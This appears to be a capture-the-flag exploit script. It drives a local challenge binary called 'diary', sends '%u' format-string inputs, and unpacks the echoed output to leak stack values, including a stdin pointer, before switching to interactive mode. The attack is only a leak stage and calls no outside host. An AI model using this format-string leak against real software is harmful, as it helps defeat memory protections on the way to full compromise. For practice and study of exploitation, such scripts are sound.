import pwnbox,struct
unpack = lambda x: struct.unpack("<Q",x)[0]
p = pwnbox.pipe.ProcessPipe("./diary")
p.read_until(":")
p.write("ABCDEF%u\n") #Name
p.read_until(":")
p.write("20\n") # age
p.read_until(">>>")
p.write("1\n") # gender
p.read_until(":")
p.write("AAAABBBB\n") # feat

p.read_until(">>>")
p.write("2\n")
p.read_until(">>>")
p.write("3\n")
p.read_until("number")
p.write("%u\n")
p.read_until("Contents")
p.write("asdf\n")
p.read_until("100")
data =  p.read_until("asdf")[:-4]
for i in range((len(data)-5)/8):
  print "%d : "%i+ hex(unpack(data[5+8*i:5+8*i+8]))
stdin = unpack(data[5+8*23:5+8*23+8])
print hex(stdin)
p.interact()

